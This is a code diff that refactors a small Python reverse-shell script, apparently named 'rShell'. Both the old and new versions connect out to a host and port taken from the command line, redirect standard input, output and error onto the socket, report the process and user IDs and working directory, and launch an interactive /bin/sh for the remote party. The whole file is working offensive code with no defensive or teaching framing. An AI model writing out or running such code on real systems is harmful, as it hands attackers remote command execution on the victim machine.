@@ -5,26 +5,41 @@ import sys
 import os
 
 
-client = socket.socket()
-client.connect((sys.argv[1], int(sys.argv[2])))
+def get_connection(host, port):
+    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    client.connect((host, int(port)))
+    return client
 
-client_fileno = client.fileno()
-os.dup2(client_fileno, 1)
-os.dup2(client_fileno, 2)
-os.dup2(client_fileno, 0)
 
-client_pid = os.getpid()
-client_uid = os.getuid()
-client_gid = os.getgid()
-client_cwd = os.getcwd()
+def set_descriptors(fd):
+    fileno = fd.fileno()
+    os.dup2(fileno, 1)
+    os.dup2(fileno, 2)
+    os.dup2(fileno, 0)
 
-while True:
-    print('rShell successfully started!')
-    print('PID:{pid}|UID:{uid}|GID:{gid}|CWD:{cwd}'.format(
-        pid=client_pid, uid=client_uid, gid=client_gid, cwd=client_cwd
-    ))
 
-    sp.call(['/bin/sh', '-i'], shell=True)
+def get_info():
+    info = {
+        'pid': os.getpid(),
+        'cwd': os.getcwd(),
+        'uid': os.getuid(),
+        'gid': os.getgid()
+    }
 
-print('End of shell...')
-client.close()
+    info = ['{}:{}'.format(key, val) for (key, val) in info.items()]
+    return '|'.join(info)
+
+
+def main(host=sys.argv[1], port=sys.argv[2]):
+    with get_connection(host, port) as client:
+        set_descriptors(client)
+        info = get_info()
+
+        while True:
+            print('rShell successfully started!')
+            print(info)
+            sp.call(['/bin/sh', '-i'], shell=True)
+
+
+if __name__ == '__main__':
+    main()
